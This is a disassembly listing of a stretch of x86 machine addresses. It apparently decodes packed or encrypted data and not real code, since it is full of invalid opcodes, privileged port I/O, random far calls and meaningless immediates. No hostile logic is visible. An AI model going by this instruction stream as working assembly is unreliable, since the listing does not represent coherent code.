  42119f:	ins    DWORD PTR es:[edi],dx
  4211a0:	add    al,0x42
  4211a2:	adc    esi,DWORD PTR [eax+0x409506ce]
  4211a8:	adc    eax,0xf0c5316
  4211ad:	aam    0xa
  4211af:	pop    edi
  4211b0:	pushf  
  4211b1:	mov    bl,bl
  4211b3:	(bad)  
  4211b4:	icebp  
  4211b5:	sub    dh,BYTE PTR [ecx]
  4211b7:	cmp    cl,ch
  4211b9:	dec    eax
  4211ba:	sti    
  4211bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211bc:	mov    WORD PTR [ebx-0x64],cs
  4211bf:	mov    ebx,0x560a21f5
  4211c4:	adc    DWORD PTR [eax-0x326a18e9],ecx
  4211ca:	(bad)  
  4211cb:	sbb    BYTE PTR [ecx+esi*4-0x40076e65],cl
  4211d2:	hlt    
  4211d3:	jbe    0x42121d
  4211d5:	inc    edx
  4211d6:	pop    edi
  4211d7:	lock not BYTE PTR [edx]
  4211da:	call   0xd469:0xd780ec2d
  4211e1:	jo     0x421243
  4211e3:	mov    ecx,0x7e55d0a3
  4211e8:	pushf  
  4211e9:	lahf   
  4211ea:	ins    BYTE PTR es:[edi],dx
  4211eb:	sub    bl,BYTE PTR [eax]
  4211ed:	fst    QWORD PTR [edi*2+0x7aef2d53]
  4211f4:	push   0xe87c51cf
  4211f9:	in     eax,0x3f
  4211fb:	adc    BYTE PTR [eax+edx*2-0x47c8849c],dl
  421202:	jbe    0x4211bd
  421204:	or     ch,BYTE PTR [ebp-0x2e]
  421207:	out    dx,al
  421208:	xchg   DWORD PTR [edx+0x64],ecx
  42120b:	jns    0x42119a
  42120d:	hlt    
  42120e:	dec    ebp
  42120f:	inc    edx
  421210:	xor    al,0xd3
  421212:	pop    edi
  421213:	push   esi
  421214:	add    edi,DWORD PTR [edi+0x72]
  421217:	xor    BYTE PTR [ebp+eiz*8-0x30],bh
  42121b:	icebp  
  42121c:	es sbb al,0x5c
  42121f:	add    al,0xae
  421221:	(bad)  gs:[eax+eax*4+0x14]
  421226:	inc    edx
  421227:	dec    edi
  421228:	add    eax,0xfde88e6a
  42122d:	cmp    al,0xa3
  42122f:	mov    ds:0x27495a06,eax
  421234:	mov    ah,0xaf
  421236:	test   DWORD PTR [esi+edx*2-0x6911757c],eax
  42123d:	cmp    al,0x2d
  42123f:	sahf   
  421240:	fcom   DWORD PTR [edx]
	...
  4212b2:	add    BYTE PTR [eax],al
  4212b4:	inc    ecx
  4212b5:	push   es
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0xde83dc15
  4212c1:	and    eax,0x636ec9b0
  4212c6:	add    DWORD PTR [eax],eax
  4212c8:	test   BYTE PTR [eax],0x0
  4212cb:	add    BYTE PTR [edx+eiz*1+0x56],ah
  4212cf:	rcr    dl,1
  4212d1:	xchg   esi,eax
  4212d2:	mov    ch,0xe
  4212d4:	mov    ds:0x7f879d8b,eax
  4212d9:	xlat   BYTE PTR ds:[ebx]
  4212da:	push   cs
  4212db:	scas   eax,DWORD PTR es:[edi]
  4212dc:	or     BYTE PTR [ecx+ebx*1],cl
  4212df:	xchg   ebp,eax
  4212e0:	xor    BYTE PTR [ecx],al
  4212e2:	jl     0x42132e
  4212e4:	xchg   esp,eax
  4212e5:	stos   BYTE PTR es:[edi],al
  4212e6:	push   cs
  4212e7:	aaa    
  4212e8:	dec    DWORD PTR [ecx+0x20755c69]
  4212ee:	outs   dx,BYTE PTR ds:[esi]
  4212ef:	mov    esi,0x5303eeb1
  4212f4:	ins    BYTE PTR es:[edi],dx
  4212f5:	add    al,0x22
  4212f7:	aaa    
  4212f8:	test   DWORD PTR [esi-0x6b],esp
  4212fb:	test   al,0x5d
  4212fd:	push   eax
  4212fe:	sub    BYTE PTR [esi-0x61],al
  421301:	dec    edi
  421302:	inc    esp
  421303:	shl    DWORD PTR [edi-0x21b4df3],1
  421309:	jnp    0x4212c3
  42130b:	lahf   
  42130c:	and    ah,BYTE PTR [edx-0x59]
  42130f:	inc    esi
  421310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421311:	mov    eax,0x8d381ca4
  421316:	es push edi
  421318:	addr16 (bad) 
  42131a:	aas    
  42131b:	clc    
  42131c:	inc    eax
  42131d:	retf   
  42131e:	push   edx
  42131f:	or     ebp,ecx
  421321:	mov    al,0x6e
  421323:	es mov ecx,0x7a11b021
  421329:	add    esi,DWORD PTR [ecx+edx*8-0x1527afed]
  421330:	cmp    eax,0x976fc1f8
  421335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421336:	fcmovne st,st(2)
  421338:	push   es
  421339:	jne    0x4212ee
  42133b:	leave  
  42133c:	xchg   ecx,eax
  42133d:	mov    al,dl
  42133f:	test   DWORD PTR [eax],ebp
  421341:	rcl    DWORD PTR [edi+0x70],1
  421344:	xchg   esp,eax
  421345:	mov    eax,0xab4d660e
  42134a:	std    
  42134b:	into   
  42134c:	popa   
  42134d:	xchg   BYTE PTR [ebp+0x3b27330f],ch
  421353:	sub    bh,al
  421355:	sub    al,BYTE PTR [eax]
  421357:	mov    eax,ds:0x5e18be46
  42135c:	(bad)  
  42135e:	fcom   DWORD PTR [ebp+0x35]
  421361:	add    BYTE PTR [edx],bh
  421363:	jle    0x4213d3
  421365:	adc    ebx,DWORD PTR [ebp+0x20]
  421368:	adc    DWORD PTR [esp+ebx*8+0x26340906],esp
  42136f:	jecxz  0x4213b4
  421371:	mov    ebp,0x5d10242f
  421376:	sub    ch,al
  421378:	out    dx,al
  421379:	pop    ss
  42137a:	fs push 0x522c4974
  421380:	jbe    0x421325
  421382:	fst    QWORD PTR [edi+0xcc56d07]
  421388:	mov    dh,0x82
  42138a:	out    0xbe,al
  42138c:	add    eax,0x3ad9b67f
  421391:	stc    
  421392:	cmp    DWORD PTR [edx+0x72],0x508ef7bc
  421399:	int    0xd4
  42139b:	cmp    ecx,DWORD PTR [ebp+0x5482f08f]
  4213a1:	outs   dx,BYTE PTR ds:[esi]
  4213a2:	mov    ds:0x5aea1e17,eax
  4213a7:	ret    0x995c
  4213aa:	ins    BYTE PTR es:[edi],dx
  4213ab:	jb     0x421354
  4213ad:	add    DWORD PTR [ebx-0x7bc2a4ce],edi
  4213b3:	(bad)  
  4213b4:	fstp   DWORD PTR [ebp+0x77]
  4213b7:	call   0x2b27:0xb54bd964
  4213be:	mov    edx,0x2a477c
	...
  421433:	add    BYTE PTR [esi+0x7f125794],ch
  421439:	shr    edi,cl
  42143b:	mov    esp,0x960320e2
  421440:	cdq    
  421441:	xor    BYTE PTR [ecx-0x30],bl
  421444:	fs add DWORD PTR fs:[eax],eax
  421448:	test   BYTE PTR [eax],0x0
  42144b:	add    BYTE PTR [ebx],ch
  42144d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42144e:	sbb    eax,0x4e315cd1
  421453:	(bad)  
  421454:	mov    al,ds:0x5b9d5b88
  421459:	mov    al,0x7f
  42145b:	add    DWORD PTR [edx],0x85f873ab
  421461:	adc    eax,0x3d913f2f
  421466:	pop    ebx
  421467:	add    BYTE PTR [ecx],0xa5
  42146a:	add    BYTE PTR [edi+0x8],ah
  42146d:	push   esi
  42146e:	and    ah,ah
  421470:	test   DWORD PTR [ebx-0xc],ebp
  421473:	and    ch,BYTE PTR [edx+0x22608a85]
  421479:	in     eax,0xde
  42147b:	in     eax,dx
  42147c:	outs   dx,BYTE PTR ds:[esi]
  42147d:	dec    edi
  42147e:	loope  0x421421
  421480:	leave  
  421481:	mov    ecx,0x4dcfb2d8
  421486:	xor    al,BYTE PTR [eax-0x5cfbbe16]
  42148c:	and    ax,dx
  42148f:	out    0x56,eax
  421491:	xlat   BYTE PTR ds:[ebx]
  421492:	popa   
  421493:	and    DWORD PTR [edx-0x7d],0x4b
  421497:	arpl   WORD PTR [ecx+ebp*2],ax
  42149a:	cwde   
  42149b:	pop    es
  42149c:	cmp    al,0x69
  42149e:	add    eax,0xecf974b6
  4214a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214a4:	xor    dh,BYTE PTR [esi-0x3c79771f]
  4214aa:	and    ah,bl
  4214ac:	sub    BYTE PTR [esi],bl
  4214ae:	std    
  4214af:	adc    esp,DWORD PTR [edi+0x59134bcc]
  4214b5:	call   DWORD PTR [eax]
  4214b7:	xor    eax,0xd258b591
  4214bc:	push   0xfc504aa0
  4214c1:	mov    dh,0x19
  4214c3:	aas    
  4214c4:	or     edx,DWORD PTR [ecx]
  4214c6:	in     eax,dx
  4214c7:	int    0xc7
  4214c9:	and    al,0x3d
  4214cb:	out    dx,al
  4214cc:	push   0xffffffdd
  4214ce:	jge    0x4214c2
  4214d0:	(bad)  
  4214d1:	std    
  4214d2:	xchg   DWORD PTR [esi-0x2109ad4],esi
  4214d8:	leave  
  4214d9:	dec    ebx
  4214da:	rcr    BYTE PTR [ebp+0x16],1
  4214dd:	jp     0x4214af
  4214df:	ds scas eax,DWORD PTR es:[edi]
  4214e1:	adc    DWORD PTR [edx-0x5ab7b984],esp
  4214e7:	sbb    BYTE PTR [ebp+0x44b20beb],ch
  4214ed:	gs test eax,0x49e03732
  4214f3:	jb     0x421485
  4214f5:	aaa    
  4214f6:	clc    
  4214f7:	pop    ss
  4214f8:	pop    ds
  4214f9:	data16 fsub QWORD PTR [ebx]
  4214fc:	inc    eax
  4214fd:	xor    bh,BYTE PTR [eax-0x5e0b9dec]
  421503:	jae    0x4214cc
  421505:	fild   WORD PTR [edx-0x68]
  421508:	daa    
  421509:	iret   
  42150a:	and    edi,DWORD PTR [ebx+0x7e0498c4]
  421510:	rol    DWORD PTR [ecx],0xb2
  421513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421514:	fcom   QWORD PTR [edx]
  421516:	(bad)  
  421517:	fs or  eax,0xc37ec55f
  42151d:	aam    0x12
  42151f:	pop    ss
  421520:	cli    
  421521:	inc    ebp
  421522:	sahf   
  421523:	jo     0x4214d7
  421525:	push   cs
  421526:	ficomp WORD PTR [eax+0x33]
  421529:	mov    esp,0xc0570061
  42152e:	and    al,0xf
  421530:	out    0xb2,al
  421532:	mov    esp,0x6dfa9262
  421537:	cmp    eax,0x9d221f1
  42153c:	imul   DWORD PTR [edi+0x537559ee]
	...
  4215b2:	add    BYTE PTR [eax],al
  4215b4:	test   BYTE PTR [eax-0x48],ch
  4215b7:	or     ah,bh
  4215b9:	fdiv   DWORD PTR [esp+ebp*8-0x55f32d34]
  4215c0:	test   dh,ch
  4215c2:	pop    ds
  4215c3:	stc    
  4215c4:	pop    edx
  4215c5:	add    DWORD PTR gs:[eax],eax
  4215c8:	test   BYTE PTR [eax],0x0
  4215cb:	add    al,ah
  4215cd:	outs   dx,BYTE PTR ds:[esi]
  4215ce:	add    ebp,DWORD PTR [eax+0x7a1793b3]
  4215d4:	dec    edx
  4215d5:	loopne 0x42156a
  4215d7:	(bad)  
  4215d9:	test   BYTE PTR [esi-0x2bb9d197],dl
  4215df:	lods   al,BYTE PTR ds:[esi]
  4215e0:	cli    
  4215e1:	repnz leave 
  4215e3:	stos   BYTE PTR es:[edi],al
  4215e4:	cs pop es
  4215e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215e7:	mov    edi,0x988a43f2
  4215ec:	cmp    al,0x18
  4215ee:	push   esi
  4215ef:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4215f1:	cmp    bl,BYTE PTR [eax-0x1e84709c]
  4215f7:	(bad)  
  4215f8:	mov    al,0x28
  4215fa:	test   BYTE PTR [ebp+0x62],dl
  4215fd:	or     eax,0xf19614df
  421602:	cwde   
  421603:	stos   BYTE PTR es:[edi],al
  421604:	pop    ds
  421605:	dec    esi
  421606:	call   0xc460:0xc3e5947f
  42160d:	nop
  42160e:	and    ebx,eax
  421610:	pop    edi
  421611:	mov    bh,0xaa
  421613:	mov    al,ds:0x4baeca00
  421618:	jbe    0x42160d
  42161a:	sub    al,BYTE PTR [ecx-0x33]
  42161d:	ja     0x4215cb
  42161f:	mov    WORD PTR [eax+0x3b1a7395],cs
  421625:	mov    dh,0x9a
  421627:	and    BYTE PTR [edx],dh
  421629:	sbb    al,0x4e
  42162b:	shl    BYTE PTR [ebp+ebp*1-0x49],0x28
  421630:	sahf   
  421631:	test   eax,0x82e7b99c
  421636:	clc    
  421637:	fcomp  DWORD PTR [ecx]
  421639:	pop    ecx
  42163a:	scas   al,BYTE PTR es:[edi]
  42163b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42163c:	xlat   BYTE PTR ds:[ebx]
  42163d:	cwde   
  42163e:	mov    al,ds:0x571d0ea7
  421643:	inc    ebp
  421644:	add    ebp,ebp
  421646:	push   ds
  421647:	test   al,0xa7
  421649:	pop    ecx
  42164a:	sub    al,0x20
  42164c:	imul   ebx,DWORD PTR [ecx-0x1e7788a7],0xffffffc1
  421653:	or     ebx,DWORD PTR [ecx-0x2e9c8084]
  421659:	inc    ebp
  42165a:	fidivr DWORD PTR [edi-0x69df83ed]
  421660:	and    al,BYTE PTR [ebx-0x76]
  421663:	dec    esi
  421664:	dec    esp
  421665:	gs stos BYTE PTR es:[edi],al
  421667:	cmp    ebx,DWORD PTR [ebx]
  421669:	inc    eax
  42166a:	clc    
  42166b:	xchg   ah,bh
  42166d:	test   al,0xb7
  42166f:	enter  0xce99,0x8
  421673:	mov    edi,0xa8504dcd
  421678:	mov    dl,0x3a
  42167a:	mul    DWORD PTR [edi]
  42167c:	mov    eax,0xfee21261
  421681:	(bad)
  421685:	mov    ah,0xa9
  421687:	popf   
  421688:	into   
  421689:	dec    ebx
  42168a:	pop    es
  42168b:	and    BYTE PTR [edi-0x24b6613f],ch
  421691:	sub    al,0x8a
  421693:	mov    eax,ds:0x360d3c5f
  421698:	cmp    cl,al
  42169a:	and    al,0xc7
  42169c:	mov    ds:0xa2073c9,eax
  4216a1:	xor    bh,BYTE PTR [ecx-0x793630ad]
  4216a7:	cmp    BYTE PTR [edi],dh
  4216a9:	daa    
  4216aa:	outs   dx,DWORD PTR ds:[esi]
  4216ab:	jg     0x421646
  4216ad:	sub    al,BYTE PTR [eax]
  4216af:	mov    al,0x31
  4216b1:	xchg   edx,eax
  4216b2:	(bad)  
  4216b4:	jmp    0x42164e
  4216b6:	pusha  
  4216b7:	jmp    DWORD PTR [ebx+0x2]
  4216ba:	int    0x4a
  4216bc:	jmp    0xab417fbb
  4216c1:	dec    ecx
	...
  421732:	add    BYTE PTR [eax],al
  421734:	mov    DWORD PTR [edi],ebp
  421736:	and    eax,0xad8aa780
  42173b:	das    
  42173c:	retf   0x8184
  42173f:	cmp    esi,DWORD PTR [edx+0x50afc3a8]
  421745:	add    WORD PTR [eax],ax
  421748:	test   BYTE PTR [eax],0x0
  42174b:	add    BYTE PTR [edi+0xa2f3cdf],ch
  421751:	retf   0xc0bd
  421754:	fiadd  WORD PTR [edx]
  421756:	rdpmc  
  421758:	iret   
  421759:	push   ebp
  42175a:	daa    
  42175b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42175c:	jno    0x42177f
  42175e:	iret   
  42175f:	mov    bh,BYTE PTR [edi+eax*4]
  421762:	jecxz  0x421795
  421764:	out    dx,eax
  421765:	cli    
  421766:	sub    dh,ch
  421768:	data16 into 
  42176a:	cmp    ah,ch
  42176c:	std    
  42176d:	sbb    esp,ecx
  42176f:	mov    ch,0xb6
  421771:	pop    edi
  421772:	sbb    BYTE PTR [ebx-0x7972e60d],bl
  421778:	add    BYTE PTR [edx-0x63],ch
  42177b:	inc    ebp
  42177c:	pop    ebp
  42177d:	cld    
  42177e:	repz int3 
  421780:	sbb    eax,0xc6fc4a6d
  421785:	xor    eax,0xabe5f432
  42178a:	jl     0x4217e4
  42178c:	ficom  DWORD PTR [ebx]
  42178e:	cmp    eax,0x8685b0fc
  421793:	push   ss
  421794:	cmp    edx,DWORD PTR [ecx-0xf]
  421797:	mov    BYTE PTR ds:0x12d2bdfa,al
  42179d:	out    dx,al
  42179e:	(bad)  
  42179f:	js     0x4217f8
  4217a1:	out    dx,eax
  4217a2:	cmp    BYTE PTR [edi+0x28],ah
  4217a5:	sub    DWORD PTR [ebx],edx
  4217a7:	int3   
  4217a8:	in     eax,dx
  4217a9:	push   ds
  4217aa:	rcl    BYTE PTR [edx+0x66],cl
  4217ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217ae:	xchg   edx,eax
  4217af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217b0:	jne    0x421786
  4217b2:	jg     0x4217c1
  4217b4:	rcl    DWORD PTR [ebx-0x3e],1
  4217b7:	inc    ebp
  4217b8:	(bad)  
  4217b9:	ror    esp,1
  4217bb:	js     0x42176f
  4217bd:	mov    eax,0xe9cbeabf
  4217c2:	pop    es
  4217c3:	inc    ecx
  4217c4:	das    
  4217c5:	pop    eax
  4217c6:	int    0xcf
  4217c8:	fiadd  WORD PTR ds:0xe04e500b
  4217ce:	popf   
  4217cf:	popf   
  4217d0:	div    ebp
  4217d2:	add    esi,DWORD PTR [ebx-0x7]
  4217d5:	jbe    0x4217eb
  4217d7:	add    bl,ah
  4217d9:	inc    ebx
  4217da:	pop    es
  4217db:	es cmp al,0x1c
  4217de:	fisttp WORD PTR [eax+0x50]
  4217e1:	dec    ecx
  4217e2:	and    eax,0x55935400
  4217e7:	aam    0xd5
  4217e9:	addr16 (bad) 
  4217eb:	scas   eax,DWORD PTR es:[edi]
  4217ec:	xor    al,0x4b
  4217ee:	pop    edx
  4217ef:	ss mov dh,0xee
  4217f2:	adc    esi,DWORD PTR [ebp-0x763dfd0f]
  4217f8:	mov    WORD PTR [eax-0x58100cbc],cs
  4217fe:	and    ecx,DWORD PTR [ebp-0x6f5fa771]
  421804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421805:	in     al,dx
  421806:	lahf   
  421807:	inc    esi
  421808:	cdq    
  421809:	xchg   ebx,eax
  42180a:	xor    cx,WORD PTR [esi-0x482e537]
  421811:	cli    
  421812:	das    
  421813:	inc    edx
  421814:	sub    bl,BYTE PTR [ebx+0x11f19d92]
  42181a:	lods   al,BYTE PTR ds:[esi]
  42181b:	mov    ch,0x81
  42181d:	xlat   BYTE PTR ds:[ebx]
  42181e:	addr16 (bad) 
  421820:	mov    ebp,0x43762a3b
  421825:	lahf   
  421826:	mov    ds:0x2c626020,al
  42182b:	out    0x42,al
  42182d:	shl    BYTE PTR [ecx],cl
  42182f:	cmp    bl,BYTE PTR [ecx]
  421831:	inc    edx
  421832:	or     DWORD PTR [ebx+0x76],ecx
  421835:	dec    sp
  421837:	jbe    0x421812
  421839:	loop   0x421823
  42183b:	mov    edi,ds
  42183d:	loopne 0x421868
  42183f:	xor    DWORD PTR [ecx+0x5],esi
	...
  4218b1:	add    BYTE PTR [eax],al
  4218b3:	add    ah,bl
  4218b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218b6:	jae    0x421905
  4218b8:	jnp    0x421899
  4218ba:	(bad)  
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    edx,DWORD PTR [ecx+0x46a9e815]
  4218c5:	add    DWORD PTR [bx+si],eax
  4218c8:	test   BYTE PTR [eax],0x0
  4218cb:	add    BYTE PTR [ebx+0x47],dl
  4218ce:	out    dx,eax
  4218cf:	ret    
  4218d0:	and    eax,0x86d3aab5
  4218d5:	ds (bad) 
  4218d7:	std    
  4218d8:	fwait
  4218d9:	xchg   ebp,eax
  4218da:	xchg   BYTE PTR [edx-0xf],ch
  4218dd:	xor    DWORD PTR [ecx+0xb86c173],esp
  4218e3:	test   al,0x36
  4218e5:	dec    esp
  4218e6:	cld    
  4218e7:	add    esi,DWORD PTR ds:0xa8cc43d0
  4218ed:	pop    edi
  4218ee:	push   esp
  4218ef:	(bad)  
  4218f0:	jg     0x4218fb
  4218f2:	push   ss
  4218f3:	int3   
  4218f4:	push   0xffffffb9
  4218f6:	jl     0x4218be
  4218f8:	loop   0x4218cb
  4218fa:	cmp    bh,BYTE PTR [ebp*1+0x45faa911]
  421901:	mov    bh,0xa5
  421903:	xor    esi,edi
  421905:	xor    al,0x2e
  421907:	div    DWORD PTR ds:0x2966df48
  42190d:	test   al,0xc9
  42190f:	adc    ecx,DWORD PTR [esi-0x690fdfce]
  421915:	mov    ebp,0x46cb68af
  42191a:	jae    0x42195a
  42191c:	repz push ebx
  42191e:	int    0xa7
  421920:	cmp    al,0xb9
  421922:	jl     0x4218f8
  421924:	dec    edi
  421925:	push   ecx
  421926:	xchg   esi,eax
  421927:	push   ds
  421928:	mov    al,0xc5
  42192a:	daa    
  42192b:	sub    bh,BYTE PTR [edi]
  42192d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42192e:	mov    WORD PTR [esi+eiz*2-0x5a85bf30],gs
  421935:	mov    ebp,0x75af3be6
  42193a:	repnz out 0x50,al
  42193d:	or     BYTE PTR [ebx-0x51],al
  421940:	frstor [esi+0x5e61c237]
  421946:	fucom  st(7)
  421948:	enter  0x537a,0xe8
  42194c:	call   0x41f79d94
  421951:	mov    bh,0xe9
  421953:	mov    bh,0x50
  421955:	pop    ebx
  421956:	sti    
  421957:	sar    BYTE PTR [edx+0xcc64e4a],0x92
  42195e:	pop    eax
  42195f:	ds inc ebx
  421961:	retf   
  421962:	push   ebp
  421963:	cmc    
  421964:	inc    edi
  421965:	and    dh,bh
  421967:	sbb    BYTE PTR [eax+ebp*4+0x5f],bl
  42196b:	sti    
  42196c:	jmp    0xc9d1:0xd7b58d00
  421973:	cmp    ecx,DWORD PTR [eax]
  421975:	xor    DWORD PTR [ecx],ebx
  421977:	push   edi
  421978:	enter  0xfa70,0x71
  42197c:	out    0x80,al
  42197e:	ja     0x4219bd
  421980:	push   es
  421981:	ret    0x5362
  421984:	leave  
  421985:	loope  0x4219ea
  421987:	arpl   si,bp
  421989:	(bad)  
  42198a:	(bad)  
  42198b:	xor    eax,0x7b7b3785
  421990:	sbb    ebp,DWORD PTR [ecx+eax*4+0x6a]
  421994:	cmp    al,BYTE PTR [edx+0x42a3ba13]
  42199a:	stc    
  42199b:	jne    0x42197a
  42199d:	jb     0x4219d2
  42199f:	inc    edx
  4219a0:	ja     0x421946
  4219a2:	sub    edx,edi
  4219a4:	retf   0xd31a
  4219a7:	or     BYTE PTR [ebx-0x36beb65f],dl
  4219ad:	popf   
  4219ae:	jo     0x4219ef
  4219b0:	inc    esi
  4219b1:	and    BYTE PTR [eax+0x44ff1610],0x3
  4219b8:	or     DWORD PTR [ebx-0x7a],esi
  4219bb:	adc    eax,0x82a54d20
  4219c0:	add    al,0xf0
	...
  421a32:	add    BYTE PTR [eax],al
  421a34:	fbstp  TBYTE PTR [edx]
  421a36:	scas   eax,DWORD PTR es:[edi]
  421a37:	adc    ebp,edi
  421a39:	lahf   
  421a3a:	(bad)  
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x206c5aa7]
  421a44:	cmp    al,0x68
  421a46:	add    DWORD PTR [eax],eax
  421a48:	test   BYTE PTR [eax],0x0
  421a4b:	add    BYTE PTR [esi+0x1e00105a],al
  421a51:	fdiv   QWORD PTR [ecx+0x58]
  421a54:	cmp    DWORD PTR [eax-0x6ecadabb],esi
  421a5a:	pop    es
  421a5b:	clc    
  421a5c:	lock add cl,BYTE PTR [edi-0x7e]
  421a60:	addr16 or dh,ah
  421a63:	mov    ebx,edi
  421a65:	adc    ebx,DWORD PTR [edx]
  421a67:	scas   al,BYTE PTR es:[edi]
  421a68:	lock pop ecx
  421a6a:	xor    al,0x78
  421a6c:	xchg   cx,ax
  421a6e:	(bad)  
  421a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a70:	pop    edi
  421a71:	add    cl,dh
  421a73:	jmp    0x421a94
  421a75:	popa   
  421a76:	cmp    ecx,ecx
  421a78:	push   ecx
  421a79:	pop    esp
  421a7a:	adc    BYTE PTR [eax-0x12770b79],dh
  421a80:	test   eax,0xe87e9459
  421a85:	and    esi,ebx
  421a87:	mov    WORD PTR [ebp+0x2ccd176f],?
  421a8d:	mov    ds:0x28b97db,al
  421a92:	out    0xf5,eax
  421a94:	int    0xdb
  421a96:	adc    eax,0x74621cc7
  421a9b:	dec    edx
  421a9c:	rcl    BYTE PTR [eax+0x48],0xb7
  421aa0:	cmp    DWORD PTR [ecx-0x36],ecx
  421aa3:	mov    eax,ds:0x1c236818
  421aa8:	fs pop ecx
  421aaa:	into   
  421aab:	leave  
  421aac:	push   ebx
  421aad:	rcr    BYTE PTR [edx+ebp*4],1
  421ab0:	push   ecx
  421ab1:	sti    
  421ab2:	mov    ah,0xb3
  421ab4:	mov    bh,0xb8
  421ab6:	add    DWORD PTR [ecx-0x48],esi
  421ab9:	ja     0x421a75
  421abb:	jmp    0x421b35
  421abd:	lock rcl BYTE PTR [edx],0x13
  421ac1:	iret   
  421ac2:	inc    esi
  421ac3:	jle    0x421ab1
  421ac5:	or     ebp,DWORD PTR [ebp-0x6ffef3cd]
  421acb:	popf   
  421acc:	inc    ecx
  421acd:	cs and dh,0x28
  421ad1:	lahf   
  421ad2:	ds rol bh,cl
  421ad5:	sbb    eax,0xdfb4517a
  421ada:	jnp    0x421acb
  421adc:	sbb    si,di
  421adf:	arpl   sp,bx
  421ae1:	xor    DWORD PTR [ecx-0x1e771611],esp
  421ae7:	push   ds
  421ae8:	or     BYTE PTR [eax],bh
  421aea:	daa    
  421aeb:	cmovge edx,ebp
  421aee:	pop    edx
  421aef:	popa   
  421af0:	and    BYTE PTR ds:0xf8ecf2b1,dl
  421af6:	jmp    0xe3c9bfa5
  421afb:	imul   ebp,DWORD PTR [edi+0x48],0xaf641ca5
  421b02:	in     eax,0xb3
  421b04:	and    eax,esp
  421b06:	xchg   edi,eax
  421b07:	or     ebx,esi
  421b09:	xor    DWORD PTR [ebx+esi*2+0x2674943a],ecx
  421b10:	shl    BYTE PTR [edx+0x26],1
  421b13:	lods   al,BYTE PTR ds:[esi]
  421b14:	dec    ebp
  421b15:	in     eax,0x80
  421b17:	jl     0x421acf
  421b19:	mov    dl,0x67
  421b1b:	dec    eax
  421b1c:	xor    BYTE PTR [eax-0x7a5cd3f7],ah
  421b22:	rol    esp,cl
  421b24:	xchg   BYTE PTR [ecx+0x29812d8],bh
  421b2a:	jae    0x421ab4
  421b2c:	mov    eax,0x951dae91
  421b31:	mov    dl,0xc5
  421b33:	pop    ebp
  421b34:	retf   
  421b35:	xchg   ecx,eax
  421b36:	addr16 mov eax,0x8e599dc
  421b3c:	fiadd  DWORD PTR [edx+eax*2-0x6c]
  421b40:	in     eax,dx
  421b41:	add    BYTE PTR ss:[eax],al
	...
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    ecx,DWORD PTR [eax+edx*2]
  421bc2:	ja     0x421bef
  421bc4:	xor    ch,BYTE PTR [ecx+0x1]
  421bc7:	add    dh,dh
  421bc9:	add    BYTE PTR [eax],al
  421bcb:	add    BYTE PTR [eax],bh
  421bcd:	in     al,0x94
  421bcf:	add    al,0xeb
  421bd1:	popa   
  421bd2:	jmp    0xe2a7:0xb44af17
  421bd9:	add    bl,BYTE PTR [esi-0x66]
  421bdc:	fsub   DWORD PTR [ebp-0x7d]
  421bdf:	push   ebp
  421be0:	pop    ss
  421be1:	xor    al,0x25
  421be3:	add    al,0xd0
  421be5:	int3   
  421be6:	lds    ebp,FWORD PTR [ebp+edi*4-0x1e]
  421bea:	sbb    ebx,ebp
  421bec:	stos   DWORD PTR es:[edi],eax
  421bed:	mov    ds:0x91f35bb6,eax
  421bf2:	fsubr  QWORD PTR [edx-0xc]
  421bf5:	lods   al,BYTE PTR ds:[esi]
  421bf6:	sbb    BYTE PTR [ecx+0x3e01cfc1],bl
  421bfc:	lods   eax,DWORD PTR ds:[esi]
  421bfd:	cmp    ch,BYTE PTR [ecx-0x7b94ed7f]
  421c03:	sub    ebp,DWORD PTR [esi]
  421c05:	jg     0x421c2e
  421c07:	inc    ecx
  421c08:	sbb    ch,dl
  421c0a:	mov    ecx,0xaae2abf7
  421c0f:	scas   eax,DWORD PTR es:[edi]
  421c10:	ss mov ebp,0xc10fe5f8
  421c16:	ret    
  421c17:	and    edx,DWORD PTR [edi+edx*8+0xce8fd37]
  421c1e:	xchg   esi,eax
  421c1f:	xor    cl,BYTE PTR [eax-0xe]
  421c22:	out    0x4c,eax
  421c24:	push   esp
  421c25:	test   eax,0x1f92ac83
  421c2a:	aad    0xe9
  421c2c:	mov    eax,ds:0x621b30d3
  421c31:	repz adc al,0xb3
  421c34:	and    ecx,DWORD PTR [eax]
  421c36:	ins    DWORD PTR es:[edi],dx
  421c37:	xchg   DWORD PTR [edx],esp
  421c39:	sub    edx,DWORD PTR [ecx-0x343d8495]
  421c3f:	out    dx,al
  421c40:	jo     0x421c69
  421c42:	mov    ebp,0x85b0851d
  421c47:	add    BYTE PTR [ebx-0x63194912],dl
  421c4d:	lea    edi,[ecx+edx*4-0x45656e23]
  421c54:	xor    BYTE PTR [edx-0x3c],dl
  421c57:	sahf   
  421c58:	mov    ds:0x8be4c6e7,eax
  421c5d:	push   edi
  421c5e:	clc    
  421c5f:	lods   eax,DWORD PTR ds:[esi]
  421c60:	adc    dh,ah
  421c62:	test   al,0x1f
  421c64:	imul   esp,DWORD PTR [ecx+0x2c],0x9f2b7fee
  421c6b:	mov    ecx,DWORD PTR [edi+eiz*2]
  421c6e:	sub    eax,0x6229f4dd
  421c73:	aaa    
